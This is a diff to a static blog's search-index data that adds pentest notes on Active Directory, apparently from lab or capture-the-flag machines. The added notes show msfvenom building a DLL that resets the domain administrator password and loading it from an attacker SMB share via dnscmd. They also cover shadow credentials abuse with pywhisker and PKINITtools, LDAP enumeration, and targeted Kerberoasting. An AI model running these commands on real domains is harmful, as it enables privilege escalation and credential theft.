@@ -1838,6 +1838,16 @@ window.store = {
     
     
     
+    "https:\/\/kdbed.github.io\/posts\/pentest_active_directory_dns\/": {
+        
+        "title": "Pentest - Active Directory - DNS",
+        "tags": [],
+        "content": "DNS DNSAdmins Being a member of the DnsAdmins group allows us to use the dnscmd.exe to specify a plugin DLL that should be loaded by the DNS service. Let\u0026rsquo;s create a DLL using msfvenom that changes the administrator password.\n1 msfvenom -p windows/x64/exec cmd=\u0026#39;net user administrator P@s5w0rd123! /domain\u0026#39; -f dll \u0026gt; da.dll Microsoft Windows [Version 10.0.26100.6584] (c) Microsoft Corporation. All rights reserved. c:\\Users\\kdbed\\kdbed.github.io\\org\u0026gt;msfvenom -p windows/x64/exec cmd=\u0026#39;net user administrator P@s5w0rd123! /domain\u0026#39; -f dll \u0026gt; da.dll c:\\Users\\kdbed\\kdbed.github.io\\org\u0026gt; Transferring this to the box would likely trigger Windows Defender, so we can use Impacket\u0026rsquo;s smbserver.py to start an SMB server and host the dll remotely.\n1 sudo impacket-smbserver share ./ Then set the remote DLL path in the Windows registry\n1 cmd /c dnscmd localhost /config /serverlevelplugindll \\\\10.10.14.9\\share\\da.dll ", 
+        "url": "https:\/\/kdbed.github.io\/posts\/pentest_active_directory_dns\/"
+    },
+    
+    
+    
     "https:\/\/kdbed.github.io\/posts\/pentest_active_directory_dpapi_backup_key_theft\/": {
         
         "title": "Pentest - Active Directory - DPAPI Backup Key Theft",
@@ -1848,11 +1858,31 @@ window.store = {
     
     
     
+    "https:\/\/kdbed.github.io\/posts\/pentest_active_directory_gmsa_dump\/": {
+        
+        "title": "Pentest - Active Directory - gMSA Dump",
+        "tags": [],
+        "content": " Reads any gMSA password blobs the user can access and parses the values.\nmicahvandeusen\n", 
+        "url": "https:\/\/kdbed.github.io\/posts\/pentest_active_directory_gmsa_dump\/"
+    },
+    
+    
+    
+    "https:\/\/kdbed.github.io\/posts\/pentest_active_directory_ldap_enumeration\/": {
+        
+        "title": "Pentest - Active Directory - LDAP Enumeration",
+        "tags": [],
+        "content": "LDAP Enumeration Anonymous binds: ropnop - windapsearch\n1 windapsearch.py -d resolute.megabank.local --dc-ip 10.10.10.169 -U \u0026gt; users Also enum4linux-ng\n", 
+        "url": "https:\/\/kdbed.github.io\/posts\/pentest_active_directory_ldap_enumeration\/"
+    },
+    
+    
+    
     "https:\/\/kdbed.github.io\/posts\/pentest_active_directory_shadow_credentials\/": {
         
         "title": "Pentest - Active Directory - Shadow Credentials",
         "tags": ["kerberos",],
-        "content": "Shadow Credentials pywhisker\nAbuse the GenericWrite ACL to get control of an account by adding shadow credentials:\n1 python3 /opt/pywhisker/pywhisker.py -d \u0026#34;certified.htb\u0026#34; -u \u0026#34;judith.mader\u0026#34; -p \u0026#34;judith09\u0026#34; --target \u0026#34;management_svc\u0026#34; --action \u0026#34;add The output is a PFX cert that can be used to authenticate as the user. Get a TGT for the user with PKINITtools:\n1 python3 /opt/PKINITtools/gettgtpkinit.py -cert-pfx vGRMeeb9.pfx certified.htb/management_svc -pfx-pass \u0026#39;25nQ6mg4JUTeQEjjNRE2\u0026#39; management_svc.ccache This will create a Kerberos ticket called management_svc.ccache file, which we can export and use the key this output provides in conjunction with getnthash.py from the same toolkit to get the NTLM hash of the management_svc user.\nSee also: targetedKerberos Links dsinternals Detecting shadow credentials hacker recipes hackingarticles medium\n", 
+        "content": "Shadow Credentials pywhisker\nAbuse the GenericWrite ACL to get control of an account by adding shadow credentials:\n1 python3 /opt/pywhisker/pywhisker.py -d \u0026#34;certified.htb\u0026#34; -u \u0026#34;judith.mader\u0026#34; -p \u0026#34;judith09\u0026#34; --target \u0026#34;management_svc\u0026#34; --action \u0026#34;add\u0026#34; The output is a PFX cert that can be used to authenticate as the user. Get a TGT for the user with PKINITtools:\n1 python3 /opt/PKINITtools/gettgtpkinit.py -cert-pfx vGRMeeb9.pfx certified.htb/management_svc -pfx-pass \u0026#39;25nQ6mg4JUTeQEjjNRE2\u0026#39; management_svc.ccache This will create a Kerberos ticket called management_svc.ccache file, which we can export and use the key this output provides in conjunction with getnthash.py from the same toolkit to get the NTLM hash of the management_svc user.\nSee also: targetedKerberos Targeted Kerberoast Links dsinternals Detecting shadow credentials hacker recipes hackingarticles medium\n", 
         "url": "https:\/\/kdbed.github.io\/posts\/pentest_active_directory_shadow_credentials\/"
     },
     
@@ -3014,6 +3044,16 @@ window.store = {
         "tags": [],
         "content": "", 
         "url": "https:\/\/kdbed.github.io\/tags\/"
+    },
+    
+    
+    
+    "https:\/\/kdbed.github.io\/posts\/targeted_kerberoast\/": {
+        
+        "title": "Targeted Kerberoast",
+        "tags": [],
+        "content": "Targeted Kerberoast targetedKerberoast is a Python script that can, like many others (e.g. GetUserSPNs.py), print \u0026ldquo;kerberoast\u0026rdquo; hashes for user accounts that have a SPN set. This tool brings the following additional feature: for each user without SPNs, it tries to set one (abuse of a write permission on the servicePrincipalName attribute), print the \u0026ldquo;kerberoast\u0026rdquo; hash, and delete the temporary SPN set for that operation. This is called targeted Kerberoasting. This tool can be used against all users of a domain, or supplied in a list, or one user supplied in the CLI.\nthehacker.recipes\n", 
+        "url": "https:\/\/kdbed.github.io\/posts\/targeted_kerberoast\/"
     },
     
     
